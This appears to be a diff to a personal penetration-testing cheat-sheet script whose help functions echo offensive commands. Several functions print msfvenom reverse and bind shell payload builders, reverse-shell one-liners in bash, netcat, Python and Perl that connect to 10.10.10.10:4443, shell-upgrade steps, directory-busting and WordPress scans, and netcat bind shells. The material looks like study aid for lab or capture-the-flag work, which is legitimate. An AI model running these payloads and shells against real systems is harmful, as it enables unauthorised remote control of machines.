@@ -127,22 +127,24 @@ echo
 
 
 function help-payloads () {
-
+echo ${reset}${red}${bold}
 print-figlet "MSFVenom Payloads"
+if which tldr > /dev/null; then tldr msfvenom ;echo ; fi
+echo "${yellow}"
+echo "msfvenom -p [payload] -f [format] LHOST=[your ip] LPORT=[your listener port]"
+echo "${reset}${white}PHP reverse shell"
+echo "${green}msfvenom -p php/meterpreter/reverse_tcp LHOST=11.10.10.10 LPORT=4443 -f raw -o shell.php"
+echo ${white}Java WAR reverse shell
+echo "${green}msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f war -o shell.war"
+echo ${white}
+echo "Linux bind shell"
+echo "${green}msfvenom -p linux/x86/shell_bind_tcp LPORT=4443 -f c -b \"\x00\x0a\x0d\x20\" -e x86/shikata_ga_nai"
+echo ${white}
+echo Linux FreeBSD reverse shell
+echo ${green}
+echo "msfvenom -p bsd/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f elf -o shell.elf"
 
 cat << "EOF"
-
-# PHP reverse shell
-msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f raw -o shell.php
-
-# Java WAR reverse shell
-msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f war -o shell.war
-
-# Linux bind shell
-msfvenom -p linux/x86/shell_bind_tcp LPORT=4443 -f c -b "\x00\x0a\x0d\x20" -e x86/shikata_ga_nai
-
-# Linux FreeBSD reverse shell
-msfvenom -p bsd/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f elf -o shell.elf
 
 # Linux C reverse shell
 msfvenom  -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f c
@@ -191,23 +193,28 @@ function help-upgradeshell {
 }
 
 function help-shellupgrade {
-cat << "EOF"
-    # Enter while in reverse shell
-    $ python -c 'import pty; pty.spawn("/bin/bash")'
-
-    Ctrl-Z
-
-    # In Kali
-    $ stty raw -echo
-    $ fg
-
-    # In reverse shell
-    $ reset
-    $ export SHELL=bash
-    $ export TERM=xterm-256color
-    $ stty rows <num> columns <cols>
-
-EOF
+echo ${red}${bold}
+print-figlet "Upgrade Shells"
+echo $reset${white}
+echo "Enter while in reverse shell"
+echo ${green}
+echo "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
+echo ""
+echo "Ctrl-Z"
+echo ${white}
+echo "In Kali"
+echo ${green}
+echo "stty raw -echo"
+echo "fg"
+echo ""
+echo ${white}
+echo "In reverse shell"
+echo ${green}
+echo "reset"
+echo "export SHELL=bash"
+echo "export TERM=xterm-256color"
+echo "stty rows <num> columns <cols>"
+echo "stty -a  # will print out your columns for you"
 
 }
 
@@ -391,22 +398,23 @@ echo ${red}${bold}
 if which figlet > /dev/null; then figlet gobuster;echo ; fi
 echo ${white}
 gobuster -h
-echo ${red}Gobuster quick directory busting
+echo "$white"
+echo Gobuster quick directory busting
 echo ${reset}${green}
 echo "gobuster dir -u 10.10.10.10 -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 80 -a Linux"
-echo ${red}${bold}
+echo "$white"
 echo Gobuster comprehensive directory busting
 echo ${reset}${green}
 echo "gobuster dir -s 200,204,301,302,307,403 -u 10.10.10.10 -w /usr/share/seclists/Discovery/Web_Content/big.txt -t 80 -a 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'"
-echo ${red}${bold}
+echo "$white"
 echo Gobuster search with file extension
 echo ${reset}${green}
 echo "gobuster dir -u 10.10.10.10 -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 80 -a Linux -x .txt,.php"
-echo ${red}${bold}
+echo "$white"
 echo Nikto web server scan
 echo ${reset}${green}
 echo "nikto -h 10.10.10.10"
-echo ${red}${bold}
+echo "$white"
 echo Wordpress scan
 echo ${reset}${green}
 echo "wpscan --url 10.10.10.10"
@@ -489,23 +497,23 @@ print-figlet Reverse Shells
 echo Bash shell
 echo ${reset}${green}
 echo "bash -i >& /dev/tcp/10.10.10.10/4443 0>&1"
-echo ${red}${bold}
+echo ${white}
 echo "Netcat without -e flag"
 echo ${reset}${green}
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f"
-echo ${red}${bold}
+echo ${white}
 echo "Netcat Linux"
 echo ${reset}${green}
 echo "nc -e /bin/sh 10.10.10.10 4443"
-echo ${red}${bold}
+echo ${white}
 echo Netcat Windows
 echo ${reset}${green}
 echo "nc -e cmd.exe 10.10.10.10 4443"
-echo ${red}${bold}
+echo ${white}
 echo Python
 echo ${reset}${green}
 echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
-echo ${red}${bold}
+echo ${white}
 echo Perl
 echo ${reset}${green}
 echo "perl -e 'use Socket;$i=\"10.10.10.10\";\$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
@@ -691,27 +699,28 @@ function help-netcat {
     echo "Connect to the listener with a client"
     echo ${green}
     echo "nc -nv $ip \$port"
-    echo ""
+    echo ${white}
     echo "Transfering files with netcat"
+    echo ${green}
     echo "nc -lnvp \$port > incomming.exe"
     echo ""
     echo "nc -nv $ip 4444 < /usr/share/windows/wget.exe"
-    echo ""
+    echo ${white}
     echo "You won't get any feedback when it's done"
     echo ""
     echo "Remote administration with -e by redirecting STDERR STDOUT and STDIN"
     echo ""
     echo "netcat bind shell"
-    echo ""
+    echo ${green}
     echo "nc -nvlp 4444 -e cmd.exe"
     echo ""
     echo "nc $ip 4444 "
     echo "   You will catch the cmd.exe prompt"
-    echo ""
+    echo ${white}
     echo "Reverse shell scenario"
-    echo ""
+    echo ${green}
     echo "nc $ip 4444 -e /bin/bash"
-    echo ""
+    echo ${white}
     echo "When you connect to the shell you will receive the prompt"
 
 }
@@ -837,4 +846,23 @@ function help-tcpdump {
 
 }
 
-
+function help-bash {
+    print-figlet "bash tips"
+    echo "variables"
+    echo ""
+    echo "\$0 the name of the script"
+    echo "\$1 the first argument"
+    echo "\$2 the second argument"
+    echo ""
+    echo 'read -p "prompt: " variable'
+    echo 'read -sp "prompt: " passwordvar'
+    echo ""
+    echo "simple if statment"
+    echo ""
+    echo "if [ some test ] "
+    echo "then"
+    echo "  some action"
+    echo "else"
+    echo "  some other action"
+    echo "fi"
+}
